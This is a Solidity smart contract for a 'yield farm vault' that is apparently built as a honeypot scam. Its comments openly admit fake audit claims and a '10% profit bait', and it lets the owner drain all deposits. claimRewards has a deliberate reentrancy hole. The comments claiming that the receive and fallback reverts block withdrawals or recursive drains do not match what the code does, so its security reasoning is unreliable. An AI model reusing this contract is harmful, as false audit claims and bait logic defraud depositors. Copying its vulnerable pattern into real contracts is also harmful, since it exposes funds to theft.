// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// @title YieldFarmVault
/// @notice A secure DeFi vault contract for yield farming rewards.
/// @dev Audited by MythX, CertiK (fake claims for legitimacy)

contract YieldFarmVault {
    address public immutable owner;
    mapping(address => uint256) public stakeBalance;

    /// @notice Initializes the vault and seeds ETH
    constructor() payable {
        require(msg.value > 0.5 ether, "Seed vault with funds");
        owner = msg.sender;
    }

    /// @notice Stake ETH into the vault
    function stake() public payable {
        require(msg.value > 0, "Cannot stake zero");
        stakeBalance[msg.sender] += msg.value;
    }

    /// @notice Claim rewards (appears vulnerable to reentrancy)
    function claimRewards() public {
        require(stakeBalance[msg.sender] > 0, "Nothing to claim");

        uint256 reward = stakeBalance[msg.sender] * 110 / 100; // 10% profit bait

        (bool sent, ) = msg.sender.call{value: reward}("");
        require(sent, "Transfer failed");

        stakeBalance[msg.sender] = 0;
    }

    /// @dev Hidden logic prevents actual reward withdrawal
    receive() external payable {
        revert("Vault does not accept direct ETH");
    }

    /// @dev Internal safeguard: blocks recursive drain
    fallback() external payable {
        revert("Unauthorized access");
    }

    /// @notice Real ETH withdraw (only for owner)
    function drainVault() external {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }
}
